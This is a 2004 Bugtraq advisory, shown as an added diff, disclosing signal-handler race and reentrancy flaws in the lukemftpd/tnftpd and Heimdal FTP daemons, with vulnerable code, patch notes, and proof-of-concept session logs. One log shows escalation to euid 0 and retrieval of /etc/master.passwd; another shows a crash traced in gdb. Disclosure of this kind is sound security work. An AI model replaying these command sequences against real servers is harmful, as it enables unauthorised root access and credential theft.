@@ -1,0 +1,330 @@
+
+Date: 22 Aug 2004 14:17:27 -0000
+From: venglin@...ebsd.lublin.pl
+To: bugtraq@...urityfocus.com
+Subject: multiple vulnerabilities in lukemftpd/tnftpd
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Multiple vulnerabilities in lukemftpd/tnftpd
+- --------------------------------------------
+Przemys�aw Frasunek <venglin@...ebsd.lublin.pl> / 14th July 2004
+
+
+0. Foreword
+
+Originally, the following paper described vulnerabilities found
+in lukemftpd, but recently I've found out, that almost identical
+portions of code were introduced into KerberosV ftpd daemon, therefore
+making it vulnerable in the same manner as lukemftpd.
+
+In the other words, all statements regarding sighandler related
+vulnerabilities in lukemftpd applies also to ftpd from Heimdal 0.6.2.
+
+1. Background
+
+lukemftpd (also known as tnftpd) is a popular ftp server, shipped with
+NetBSD, FreeBSD, MacOS X and packaged with some Linux distributions.
+On NetBSD and MacOS X it is used as default ftp server.
+
+Project site: http://freshmeat.net/projects/tnftpd
+
+All described vulnerabilities were introduced over three years ago by
+the following CVS commit:
+
+ Revision 1.123 / (download) - annotate - [select for diffs], Sun Apr 1 23:04:31 2001 UTC (3 years, 4 months ago) by aidan
+ Branch: MAIN
+ Changes since 1.122: +31 -22 lines
+ Diff to previous 1.122 (colored)
+
+ As threatened, handle OOB commands from within ftpcmd.y.
+ This involved changing the yacc syntax to be line-oriented, rather than
+ having it run against the entire input at once, and adding a flag to
+ struct tab, to indicate if or not it's acceptable for a command to occur
+ OOB.
+
+Original 4.4BSD ftp daemon, as well as FreeBSD's one allows delivering
+only ABOR and STAT commands in OOB mode, but reworked lukemftpd sighandler
+code reenters command parser after SIGURG:
+
+static void
+myoob(int signo)
+{
+	char *cp;
+
+	/* only process if transfer occurring */
+	if (!transflag)
+		return;
+	cp = tmpline;
+	if (getline(cp, sizeof(tmpline), stdin) == NULL) {
+		reply(221, "You could at least say goodbye.");
+		dologout(0);
+	}
+	is_oob = 1;
+        ftp_handle_line(cp);
+        is_oob = 0;
+}
+
+2. First vulnerability: transflag remains set
+
+If transfer gets interrupted and issued command is other than ABOR,
+transflag remains set, because only abor() does longjmp to urgcatch.
+This bug makes possible to interrupt any command with SIGURG.
+
+Proof of concept -- relogging with USER/PASS after interrupting STOR:
+
+- --------------------------------------------------------------------
+Connected to 1.1.1.1. Trying to log in.
+<-- 220 x FTP server (NetBSD-ftpd 20030122) ready.
+- --> USER x
+<-- 331 Password required for x.
+- --> PASS x
+<-- 230-
+<--     FreeBSD 4.9-STABLE (RIGET) #0: Sun Feb 22 14:03:30 CET 2004
+<--
+<-- 230 User x logged in.
+Logged in, starting dummy transfer.
+- --> PORT 1,1,1,1,66,199
+<-- 200 PORT command successful.
+- --> STOR 31337
+<-- 150 Opening ASCII mode data connection for '31337'.
+- --> �USER x
+- --> �USER x
+<-- 331 Password required for x.
+- --> PASS x
+<-- 230-
+<--     FreeBSD 4.9-STABLE (RIGET) #0: Sun Feb 22 14:03:30 CET 2004
+<--
+<-- 230 User x logged in.
+Ok, relogged with transflag = 1
+
+(gdb) att 16120
+(gdb) print transflag
+$1 = 1
+- --------------------------------------------------------------------
+
+Session context is now cleared, but transflag is still set. Now we can
+take the advantage of other vulnerabilities.
+
+3. Second vulnerability: interrupting non-atomic modifications
+
+Issuing USER command while already logged in, clears the session context
+and does seteuid(0). After calling PASS command, the following
+pseudocode is executed:
+
+{
+	if (check_password(pass) == 1) {
+		logged_in = 1;
+		count_users();
+		syslog();
+		...
+		seteuid(user);
+	}
+}
+
+Delivering SIGURG between setting the logged_in flag and doing seteuid(user)
+takes ftpd back to command parser with euid=0. 
+
+Proof of concept:
+
+- --------------------------------------------------------------------
+Connected to 1.1.1.1. Trying to log in.
+<-- 220 x FTP server (NetBSD-ftpd 20030122) ready.
+- --> USER x
+<-- 331 Password required for x.
+- --> PASS x
+<-- 230-
+<--     FreeBSD 4.9-STABLE (RIGET) #0: Sun Feb 22 14:03:30 CET 2004
+<--
+<-- 230 User x logged in.
+Logged in, starting dummy transfer.
+- --> PORT 1,1,1,1,148,252
+<-- 200 PORT command successful.
+- --> STOR 31337
+<-- 150 Opening ASCII mode data connection for '31337'.
+- --> �USER x
+- --> �USER x
+<-- 331 Password required for x.
+- --> PASS x
+<-- 230-
+<--     FreeBSD 4.9-STABLE (RIGET) #0: Sun Feb 22 14:03:30 CET 2004
+<--
+<-- 230 User x logged in.
+Ok, relogged with transflag = 1
+- --> USER x
+<-- 331 Password required for x.
+ftpd has euid=0 now, entering time critical section
+- --> �
+
+CWD /
+<-- 500 '': command not understood.
+250 CWD command successful.
+CWD /etc
+250 CWD command successful.
+RETR master.passwd
+125 Using existing data connection for 'master.passwd' (1177 bytes).
+226 Transfer complete.
+- --------------------------------------------------------------------
+
+This bug is exploitable only, when lukemftpd runs without -r flag and
+attacker has access to account in REAL class.
+
+My research shows that possibility of such race condition is extremely rare,
+even impossible when logged over the network.
+
+4. Third vulnerability: re-entering libc functions
+
+Many instances of syslog(), malloc(), free() are used in ftpd code. Those
+functions, as well as many others are NOT reentry-safe.  By delivering
+a signal when malloc(), free() or any other libcall of this kind is being
+called, all subsequent calls to the heap management routines made from
+signal handler would have unpredictable effect, as heap state is completely
+unpredictable for the programmer.
+
+Unlike previous vulnerabilities, this one can be exploited by any
+user, even anonymous, giving remote root sheel. Of course, running
+lukemftpd with -r prevents attacker from getting uid=0.
+
+5. Fourth vulnerability: longjmp() in abor() returns to stack when ABORting
+   other commands than RETR/STOR
+
+This vulnerability also can be exploited by anonymous user, giving remote
+root sheel.
+
+abor() assumes that urgcatch jmpbuf is initalized, but according to the
+setjmp(3), "The longjmp() routines may not be called after the routine
+which called the setjmp() routines returns."
+
+Such behaviour of longjmp()/setjmp() seems to be specific to *BSD, as
+I couldn't reproduce it on Linux.
+
+Proof of concept:
+- --------------------------------------------------------------------
+Connected to 1.1.1.1. Trying to log in.
+<-- 220 x FTP server (NetBSD-ftpd 20030122) ready.
+- --> USER x
+<-- 331 Password required for x.
+- --> PASS x
+<-- 230-
+<--     FreeBSD 4.9-STABLE (RIGET) #0: Sun Feb 22 14:03:30 CET 2004
+<--
+<-- 230 User x logged in.
+Logged in, starting dummy transfer.
+- --> PORT 1,1,1,1,205,38
+<-- 200 PORT command successful.
+- --> STOR 31337
+<-- 150 Opening ASCII mode data connection for '31337'.
+- --> �USER x
+- --> �USER x
+<-- 331 Password required for x.
+- --> PASS x
+<-- 230-
+<--     FreeBSD 4.9-STABLE (RIGET) #0: Sun Feb 22 14:03:30 CET 2004
+<--
+<-- 230 User x logged in.
+Ok, relogged with transflag = 1
+- --> �ABOR
+- --> �ABOR
+426 Transfer aborted. Data connection closed.
+226 Abort successful
+[segfault here]
+
+(gdb) b abor
+Breakpoint 1 at 0x8053ca6: file /usr/src/libexec/lukemftpd/../../contrib/lukemftpd/src/ftpd.c, line 2531.
+(gdb) cont
+Continuing.
+
+Breakpoint 1, abor ()
+    at /usr/src/libexec/lukemftpd/../../contrib/lukemftpd/src/ftpd.c:2531
+2531            tmpline[0] = '\0';
+(gdb) bt
+#0  abor ()
+    at /usr/src/libexec/lukemftpd/../../contrib/lukemftpd/src/ftpd.c:2531
+#1  0x8056d2e in yyparse ()
+    at /usr/src/libexec/lukemftpd/../../contrib/lukemftpd/src/ftpcmd.y:475
+#2  0x805545f in ftp_handle_line (cp=0x8063c40 "ABOR\n")
+    at /usr/src/libexec/lukemftpd/../../contrib/lukemftpd/src/ftpcmd.y:1470
+#3  0x8053e06 in myoob (signo=16)
+    at /usr/src/libexec/lukemftpd/../../contrib/lukemftpd/src/ftpd.c:2568
+#4  0xbfbfffac in ?? ()
+#5  0x4813a3ab in __srefill () from /usr/lib/libc.so.4
+#6  0x4813a24f in __srget () from /usr/lib/libc.so.4
+#7  0x80552fd in getline (s=0x8064780 "PASS x\n", n=511, iop=0x48156f00)
+    at /usr/src/libexec/lukemftpd/../../contrib/lukemftpd/src/ftpcmd.y:1425
+#8  0x80554a4 in ftp_loop ()
+    at /usr/src/libexec/lukemftpd/../../contrib/lukemftpd/src/ftpcmd.y:1480
+#9  0x804fcae in main (argc=1, argv=0xbfbffaec)
+    at /usr/src/libexec/lukemftpd/../../contrib/lukemftpd/src/ftpd.c:569
+#10 0x804ae35 in _start ()
+[notice that send_data() has already returned before ABOR]
+(gdb) n
+2532            is_oob = 0;
+(gdb) n
+2533            reply(426, "Transfer aborted. Data connection closed.");
+(gdb) n
+2534            reply(226, "Abort successful");
+(gdb) n
+2535            longjmp(urgcatch, 1);
+(gdb) n
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbfbff9a8 in ?? ()
+(gdb) x/x 0xbfbff9a8
+0xbfbff9a8:     0x48156f00
+- --------------------------------------------------------------------
+
+6. References
+
+Most sighandler related problems are described in "Delivering Signals for
+Fun and Profit" paper by Michal Zalewski:
+http://lcamtuf.coredump.cx/signals.txt
+
+7. Patch
+
+All reported vulnerabilities were recently fixed in NetBSD source tree:
+
+Module Name:src
+Committed By:lukem
+Date: Aug  9 12:56:48 UTC 2004
+
+Modified Files:
+src/libexec/ftpd: cmds.c conf.c extern.h ftpcmd.y ftpd.c logutmp.c
+    logwtmp.c popen.c version.h
+
+Log Message:
+Fixes from (or inspired by) OpenBSD:
+* Fix yacc parser error recovery so that setjmp(3)/longjmp(3) is unnecessary.
+* Fix SIGURG handler to set an urgflag that's later tested, rather than
+  abusing setjmp(3)/longjmp(3).
+* Use "volatile sig_atomic_t" as the type of variables modified by sig handlers.
+* Use sigaction(3) instead of signal(3) to set the signal handlers.
+* Only set the main SIGALRM handler once.  If we need to change it,
+  cache the old handler and restore appropriately...
+* Remove a bunch of signal races by improving the signal handlers.
+* Fix memory leak with 'ESPV ALL'.
+
+My stuff:
+* Clean up the debug message in reply(); use vsnprintf(3) instead of vsyslog(3).
+* Rework parsing of OOB commands to _not_ use the yacc parser, since the
+  latter isn't reentrant and the hacks to work around that are ugly.
+  We now examine urgflag at appropriate locations and call handleoobcmd()
+  if it's set.  Since the only OOB commands we currently implement are
+  ABOR and STAT, this isn't an issue.  (I also can't find the reference in
+  RFC2228 where MIC, CONF & ENC are OOB-only commands.  Go figure.)
+  I could clean up the is_oob stuff some more, but the remaining stuff
+  in ftpcmd.y is harmless and it's unnecessary churn right this moment.
+
+- -- 
+* Fido: 2:480/124 ** WWW: http://www.frasunek.com/ ** NICHDL: PMF9-RIPE *
+* JID: venglin@...ber.atman.pl ** PGP ID: 2578FCAD ** HAM-RADIO: SQ8JIV *
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.2.4 (FreeBSD)
+
+iD8DBQFBKKr3kxEnBiV4/K0RAnpyAKCYuaEbM0VVxhroT5UghBGYXJeGrgCgt2GW
+h4qmzSAY/EfODipnuWkYrx0=
+=fYv6
+-----END PGP SIGNATURE-----
+
+
